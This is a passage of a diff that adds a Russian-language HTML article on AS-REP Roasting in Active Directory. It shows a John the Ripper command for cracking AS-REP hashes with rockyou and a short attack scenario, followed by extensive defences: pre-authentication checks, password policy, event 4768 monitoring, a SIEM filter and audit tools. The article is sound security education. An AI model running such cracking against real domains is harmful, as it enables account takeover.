+    - режим для AS-REP RC4-HMAC
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <code>
+     rockyou.txt
+    </code>
+    - словарь паролей
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/9.png" rel="noopener noreferrer" target="_blank">
+   <img alt="9" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/9.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   John the Ripper
+  </h3>
+ </div>
+ <p dir="auto">
+  Поддерживает AS-REP Roasting из коробки:
+ </p>
+ <div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto">
+  <pre>john --wordlist=/usr/share/wordlists/rockyou.txt asrep-hashes.txt</pre>
+ </div>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/10.png" rel="noopener noreferrer" target="_blank">
+   <img alt="10" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/10.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   4.4 Сценарий атаки (вкратце)
+  </h2>
+ </div>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    Злоумышленник получает доступ в домен как обычный пользователь (или просто подключён к сети).
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Сканирует Active Directory на предмет учеток без pre-auth.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Получает AS-REP-хеши от имени уязвимых пользователей.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Выполняет перебор хешей на своей машине.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    В случае успеха получает пароль и может аутентифицироваться как данный пользователь.
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   5. Методы защиты от AS-REP Roasting
+  </h1>
+ </div>
+ <p dir="auto">
+  Атака AS-REP Roasting возможна только при наличии в домене пользователей с отключенной
+  <strong>
+   pre-authentication
+  </strong>
+  . Поэтому основные меры защиты сводятся к
+  <strong>
+   обнаружению
+  </strong>
+  ,
+  <strong>
+   ограничению
+  </strong>
+  и
+  <strong>
+   контролю
+  </strong>
+  таких учетных записей. Вот подробный разбор, как можно
+        эффективно защититься.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   5.1 Включение pre-authentication для всех пользователей
+  </h2>
+ </div>
+ <p dir="auto">
+  Самый надёжный способ предотвратить AS-REP Roasting -
+  <strong>
+   обеспечить, чтобы у всех учетных записей
+            была включена pre-authentication
+  </strong>
+  .
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Как проверить?
+  </h3>
+ </div>
+ <p dir="auto">
+  <strong>
+   Через PowerShell
+  </strong>
+  :
+ </p>
+ <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c1">Get-ADUser</span> <span class="pl-k">-</span>Filter <span class="pl-k">*</span> <span class="pl-k">-</span>Properties DoesNotRequirePreAuth <span class="pl-k">|</span> <span class="pl-c1">Where-Object</span> { <span class="pl-c1">$_<span class="pl-smi">.DoesNotRequirePreAuth</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span> }</pre>
+ </div>
+ <p dir="auto">
+  <strong>
+   В Active Directory Users and Computers
+  </strong>
+  :
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Открой свойства пользователя.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Перейди во вкладку
+    <strong>
+     "Account"
+    </strong>
+    .
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Убедись, что опция
+    <strong>
+     "Do not require Kerberos preauthentication"
+    </strong>
+    НЕ
+                установлена.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/11.png" rel="noopener noreferrer" target="_blank">
+   <img alt="11" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/11.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Что делать?
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Если галочка стоит без необходимости — снять её.
+    </strong>
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Использовать отдельные сервисные аккаунты только при крайней необходимости, и с жестким
+                контролем (см. ниже).
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   5.2 Минимизация использования сервисных учёток без pre-auth
+  </h2>
+ </div>
+ <p dir="auto">
+  Иногда pre-auth отключается осознанно - для сервисных или устаревших приложений. В этом случае:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Изолируйте такие учётки, ограничив:
+   </p>
+   <ul dir="auto">
+    <li>
+     <p dir="auto">
+      Время входа в систему;
+     </p>
+    </li>
+    <li>
+     <p dir="auto">
+      Доступ к сетевым ресурсам;
+     </p>
+    </li>
+    <li>
+     <p dir="auto">
+      Область действия (через
+      <code>
+       AllowedToAuthenticateTo
+      </code>
+      ,
+      <code>
+       LogonWorkstations
+      </code>
+      , и т.д.).
+     </p>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    При возможности замените устаревшие решения на поддерживающие pre-authentication.
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   5.3 Повышение сложности и уникальности паролей
+  </h2>
+ </div>
+ <p dir="auto">
+  AS-REP атака эффективна только при слабых паролях. Поэтому:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Внедрите
+    <strong>
+     политику сложности паролей
+    </strong>
+    :
+   </p>
+   <ul dir="auto">
+    <li>
+     <p dir="auto">
+      Длина: не менее 12–16 символов;
+     </p>
+    </li>
+    <li>
+     <p dir="auto">
+      Использование букв, цифр, спецсимволов;
+     </p>
+    </li>
+    <li>
+     <p dir="auto">
+      Запрет распространённых паролей (можно через сторонние фильтры).
+     </p>
+    </li>
+   </ul>
+  </li>
+  <li>
+   <p dir="auto">
+    Обновляйте пароли регулярно.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Рассмотрите внедрение
+    <strong>
+     хранилища паролей
+    </strong>
+    и
+    <strong>
+     Kerberos Managed Service
+                    Accounts
+    </strong>
+    (gMSA) для автоматического управления сервисными учётками.
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   5.4 Мониторинг и логирование
+  </h2>
+ </div>
+ <p dir="auto">
+  Встроенные средства Windows позволяют отслеживать попытки получения AS-REP.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Включение логирования событий Kerberos
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Журнал:
+    <code>
+     Security
+    </code>
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Ивент-ID:
+    <strong>
+     4768
+    </strong>
+    (Authentication Ticket Request)
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  <a href="https://github.com/ShAmRoWw/articles/blob/main/article_asreproasting/12.png" rel="noopener noreferrer" target="_blank">
+   <img alt="12" src="https://github.com/ShAmRoWw/articles/raw/main/article_asreproasting/12.png" style="max-width: 100%;"/>
+  </a>
+ </p>
+ <p dir="auto">
+  Для AS-REP Roasting характерны события, где:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Тип учетной записи -
+    <code>
+     User
+    </code>
+    ;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Имя аккаунта - сервисная/автоматическая учетка;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Pre-authentication not required -
+    <strong>
+     Yes
+    </strong>
+    .
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Пример фильтра в SIEM
+  </h3>
+ </div>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>(EventID=4768) AND (PreAuthType=0)
+    </code></pre>
+ </div>
+ <p dir="auto">
+  Также можно настроить алерты в SIEM, когда:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    В течение короткого времени запрошено много AS-REP билетов;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Необычный пользователь пытается аутентифицироваться от имени разных аккаунтов.
+   </p>
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   5.5 Использование инструментов аудита безопасности
+  </h2>
+ </div>
+ <p dir="auto">
+  Используйте утилиты и сканеры для регулярного аудита AD:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     PingCastle
+    </strong>
+    ,
+    <strong>
+     BloodHound
+    </strong>
+    - анализ рисков и выявление слабых
+                конфигураций;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     ADRecon
+    </strong>
+    ,
+    <strong>
+     Purple Knight
+    </strong>
+    - аудит параметров безопасности;
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Script-based
+    </strong>
+    (например, PowerShell-скрипты от Microsoft или
+                GitHub-сообщества).
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  Регулярный аудит позволит оперативно выявить слабые места, до того как их найдёт злоумышленник.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   Заключение
+  </h1>
+ </div>
+ <p dir="auto">
+  Атака
+  <strong>
+   AS-REP Roasting
+  </strong>
+  демонстрирует, насколько критически важно правильно настраивать
+        параметры безопасности в инфраструктуре Active Directory. Изучив работу протокола Kerberos, мы поняли, что
+        отключение предварительной аутентификации у учетных записей может превратить их в уязвимый узел, который
+        злоумышленники будут использовать для получения зашифрованных хэшей паролей. Эти данные позволяют провести
+        офлайн-взлом, что делает атаку тихой и эффективной.
+ </p>
+ <p dir="auto">
+  В статье мы рассмотрели основные этапы атаки:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Выявление уязвимых учетных записей,
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Получение AS-REP-хэша через специализированные инструменты,
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Оффлайн-перебор паролей с использованием Hashcat или John the Ripper.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  Наиболее эффективной мерой защиты является обеспечение обязательного использования предварительной
+        аутентификации, однако наряду с этим важно применять комплексный подход:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    минимизировать использование сервисных учетных записей с отключенной предварительной
+                аутентификацией,
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    внедрять строгие политики сложности паролей,
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    регулярно проводить аудит Active Directory,
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    настраивать мониторинг и логирование запросов аутентификации.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  В результате системного подхода к защите можно существенно снизить риски, связанные с AS-REP Roasting,
+        и повысить общую устойчивость сети к атакам.
+ </p>
+</article>
